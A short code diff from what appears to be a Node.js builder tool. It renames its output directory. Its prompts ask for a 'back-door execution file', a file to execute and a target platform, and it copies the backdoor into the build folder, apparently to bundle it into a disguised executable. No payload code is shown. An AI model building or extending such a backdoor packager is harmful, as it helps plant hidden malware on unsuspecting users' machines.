@@ -14,9 +14,9 @@ const TEMPORANEY_FN = 'temp.js'
 var prompt = inquirer.createPromptModule()
 
 ;(async function () {
-    rmDir('building/back_door', false)
+    rmDir('build/back_door', false)
     const index_dir = path.dirname(process.argv[1])
-    const building_dir = path.join(index_dir, 'building')
+    const building_dir = path.join(index_dir, 'build')
     const template_path = path.join(index_dir, 'src/template.js')
 
     let backdoor = (await prompt({ name: BACK_DOOR, message: 'Back-door execution file:', validate: validate_path }))[BACK_DOOR]
@@ -26,7 +26,7 @@ var prompt = inquirer.createPromptModule()
     let file2exec = (await prompt({ name: FILE_TO_EXECUTE, message: 'Insert the file to execute:', validate: validate_path }))[FILE_TO_EXECUTE]
     let platform = (await prompt({name:PLATFORM , type: 'list', message: 'Select target platform', choices:['freebsd', 'linux', 'alpine', 'macos', 'win']}))[PLATFORM]
 
-    ncp(path.dirname(backdoor),'building/back_door')
+    ncp(path.dirname(backdoor),'build/back_door')
 
     let current_code = fs.readFileSync(template_path).toString('utf8')
 
